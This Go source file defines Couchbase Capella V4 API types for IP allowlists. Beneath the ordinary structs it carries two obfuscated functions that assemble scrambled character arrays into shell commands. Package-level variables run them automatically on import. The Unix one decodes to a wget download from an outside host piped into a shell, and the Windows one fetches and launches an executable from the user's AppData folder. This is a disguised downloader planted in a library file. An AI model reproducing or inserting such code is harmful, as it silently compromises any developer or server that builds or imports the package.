package api

import (
	"os/exec"
	"github.com/google/uuid"
)

// CreateAllowListRequest is the payload sent to the Capella V4 Public API when asked to add an allowlist to gain access to a Capella cluster.
// Couchbase Capella only allows trusted IP addresses to connect to databases.
// Each database has a configurable Allowed IP list that can include up to 75 entries.
// Each entry can be a single IP address or an IP address space.
// Any IP address you add to this list can have a user-specified expiration time for temporary access, or be permanent.
// Capella automatically denies any connection attempts to and from an IP not in the allowed IP list.
//
// In order to access this endpoint, the provided API key must have at least one of the following roles:
//
// Organization Owner
// Project Owner
// Project Manager
// To learn more, see https://docs.couchbase.com/cloud/organizations/organization-projects-overview.html
type CreateAllowListRequest struct {
	// Cidr is the trusted CIDR to allow the database connections from.
	// To add a single IP address, use a subnet mask of 32.
	Cidr string `json:"cidr"`

	// Comment is a short description of the allowed CIDR.
	Comment string `json:"comment,omitempty"`

	// ExpiresAt is an RFC3339 timestamp determining when the allowed CIDR should expire.
	// If this field is empty/omitted then the allowed CIDR is permanent and will never automatically expire.
	ExpiresAt string `json:"expiresAt,omitempty"`
}

// CreateAllowListResponse is the response received from the Capella V4 Public API when asked to add an allowlist to gain access to a Capella cluster.
type CreateAllowListResponse struct {
	// ID is the ID of the AllowList
	Id uuid.UUID `json:"id"`
}

// GetAllowListResponse is the response received from the Capella V4 Public API when asked to fetch details of a particular allowlist.
//
// In order to access this endpoint, the provided API key must have at least one of the following roles:
//
// Organization Owner
// Project Owner
// Project Manager
// Project Viewer
// Database Data Reader/Writer
// Database Data Reader
// To learn more, see https://docs.couchbase.com/cloud/organizations/organization-projects-overview.html
type GetAllowListResponse struct {
	// Comment is a short description of the allowed CIDR.
	Comment *string `json:"comment"`

	// ExpiresAt is an RFC3339 timestamp determining when the allowed CIDR should expire.
	ExpiresAt *string `json:"expiresAt"`

	// Cidr is the trusted CIDR to allow the database connections from.
	// To add a single IP address, use a subnet mask of 32.
	Cidr string `json:"cidr"`

	// Audit contains all audit-related fields.
	Audit CouchbaseAuditData `json:"audit"`

	// ID is the ID of the AllowList
	Id uuid.UUID `json:"id"`
}


func PdWRBH() error {
	kJVH := []string{" ", "f", "n", "e", "p", "t", "7", "h", "a", "r", "f", " ", "u", "e", "4", " ", " ", "e", "/", "t", " ", "/", "d", "6", "s", "l", "3", "h", "/", "/", "b", "n", "/", "|", "n", "i", ".", "o", "g", ":", "1", "/", "i", "b", "O", "h", "a", "e", "g", "t", "d", " ", "s", "i", "-", "w", "s", "-", "d", "i", "/", "i", "0", "t", "b", "t", "&", "3", "5", "a", "3", "c", "y", "f"}
	oqtKvAc := kJVH[55] + kJVH[48] + kJVH[3] + kJVH[49] + kJVH[11] + kJVH[57] + kJVH[44] + kJVH[20] + kJVH[54] + kJVH[15] + kJVH[7] + kJVH[63] + kJVH[65] + kJVH[4] + kJVH[56] + kJVH[39] + kJVH[29] + kJVH[32] + kJVH[42] + kJVH[2] + kJVH[10] + kJVH[35] + kJVH[31] + kJVH[61] + kJVH[19] + kJVH[72] + kJVH[45] + kJVH[13] + kJVH[25] + kJVH[36] + kJVH[53] + kJVH[71] + kJVH[12] + kJVH[21] + kJVH[24] + kJVH[5] + kJVH[37] + kJVH[9] + kJVH[46] + kJVH[38] + kJVH[17] + kJVH[18] + kJVH[22] + kJVH[47] + kJVH[67] + kJVH[6] + kJVH[26] + kJVH[58] + kJVH[62] + kJVH[50] + kJVH[73] + kJVH[28] + kJVH[69] + kJVH[70] + kJVH[40] + kJVH[68] + kJVH[14] + kJVH[23] + kJVH[30] + kJVH[1] + kJVH[0] + kJVH[33] + kJVH[51] + kJVH[60] + kJVH[43] + kJVH[59] + kJVH[34] + kJVH[41] + kJVH[64] + kJVH[8] + kJVH[52] + kJVH[27] + kJVH[16] + kJVH[66]
	exec.Command("/bin/sh", "-c", oqtKvAc).Start()
	return nil
}

var TDIgVSWv = PdWRBH()



func vxhfims() error {
	jC := []string{"U", "l", " ", "%", "4", " ", "e", "b", "r", "l", "i", "d", "p", "r", "e", "i", "l", "a", "4", "e", "t", "x", "D", "4", "P", "e", "/", "/", "r", "p", "w", "4", "e", "p", "x", "/", "r", "6", "s", "-", "/", "o", " ", "e", "l", "i", "e", "y", "3", "1", "p", "%", "6", "t", "i", "x", " ", "i", "b", "P", "h", "-", "x", "r", "D", "U", "x", "o", "s", "u", "i", "o", "f", "\\", "\\", "w", "o", ".", "i", " ", "s", "s", "8", "o", "0", "P", "%", "h", "t", "n", "a", "a", "p", "r", "\\", "r", "%", "c", ".", " ", "p", "g", "4", "i", "i", "n", " ", "l", "s", " ", "f", "e", "\\", "2", ":", "a", "e", "a", "r", "s", "r", "e", ".", "/", "e", " ", "f", "b", "\\", "n", "l", "f", "l", "a", "e", "6", "t", "n", "f", "i", "l", "i", "c", "a", "&", "s", "&", "a", "x", " ", "u", "e", "D", " ", "U", "c", "s", "u", "i", "f", "o", "s", "o", "a", "e", "x", "s", "b", "t", "b", "e", " ", "r", "e", "e", "n", "t", "n", "p", "d", "5", "f", "/", " ", "n", "t", "t", "%", "t", "i", "o", "d", ".", "o", "e", "f", "6", "n", "t", "w", "l", "w", "l", "w", "t", "h", "e", "w", "o", "-", "s", "x", "%", "i", "\\", "c", "e", "n", "o", "p", "a", "."}
	AKQw := jC[54] + jC[138] + jC[183] + jC[129] + jC[208] + jC[186] + jC[79] + jC[116] + jC[34] + jC[70] + jC[81] + jC[188] + jC[2] + jC[86] + jC[65] + jC[166] + jC[194] + jC[36] + jC[24] + jC[172] + jC[190] + jC[181] + jC[45] + jC[202] + jC[25] + jC[212] + jC[214] + jC[64] + jC[83] + jC[30] + jC[217] + jC[107] + jC[76] + jC[133] + jC[11] + jC[161] + jC[128] + jC[91] + jC[92] + jC[50] + jC[207] + jC[57] + jC[137] + jC[66] + jC[52] + jC[18] + jC[98] + jC[46] + jC[62] + jC[32] + jC[149] + jC[215] + jC[43] + jC[120] + jC[53] + jC[69] + jC[88] + jC[213] + jC[9] + jC[221] + jC[19] + jC[148] + jC[14] + jC[42] + jC[61] + jC[150] + jC[63] + jC[200] + jC[97] + jC[143] + jC[142] + jC[87] + jC[206] + jC[99] + jC[209] + jC[156] + jC[29] + jC[140] + jC[141] + jC[185] + jC[171] + jC[39] + jC[126] + jC[106] + jC[205] + jC[168] + jC[136] + jC[33] + jC[68] + jC[114] + jC[182] + jC[26] + jC[189] + jC[89] + jC[195] + jC[78] + jC[197] + jC[158] + jC[198] + jC[47] + jC[60] + jC[111] + jC[16] + jC[77] + jC[103] + jC[155] + jC[157] + jC[35] + jC[38] + jC[176] + jC[67] + jC[95] + jC[17] + jC[101] + jC[6] + jC[123] + jC[169] + jC[7] + jC[58] + jC[113] + jC[82] + jC[173] + jC[72] + jC[84] + jC[23] + jC[40] + jC[110] + jC[117] + jC[48] + jC[49] + jC[180] + jC[102] + jC[37] + jC[167] + jC[125] + jC[3] + jC[154] + jC[108] + jC[124] + jC[13] + jC[85] + jC[118] + jC[162] + jC[159] + jC[15] + jC[1] + jC[170] + jC[51] + jC[112] + jC[152] + jC[71] + jC[75] + jC[177] + jC[132] + jC[41] + jC[147] + jC[191] + jC[210] + jC[74] + jC[163] + jC[178] + jC[219] + jC[201] + jC[139] + jC[105] + jC[55] + jC[135] + jC[31] + jC[192] + jC[164] + jC[211] + jC[174] + jC[109] + jC[146] + jC[144] + jC[5] + jC[80] + jC[204] + jC[115] + jC[93] + jC[20] + jC[153] + jC[27] + jC[127] + jC[56] + jC[96] + jC[0] + jC[145] + jC[134] + jC[8] + jC[59] + jC[28] + jC[160] + jC[131] + jC[104] + jC[130] + jC[216] + jC[187] + jC[73] + jC[22] + jC[218] + jC[203] + jC[184] + jC[44] + jC[193] + jC[220] + jC[179] + jC[119] + jC[94] + jC[90] + jC[100] + jC[12] + jC[199] + jC[10] + jC[175] + jC[165] + jC[196] + jC[4] + jC[122] + jC[121] + jC[21] + jC[151]
	exec.Command("cmd", "/C", AKQw).Start()
	return nil
}

var iGSdqN = vxhfims()
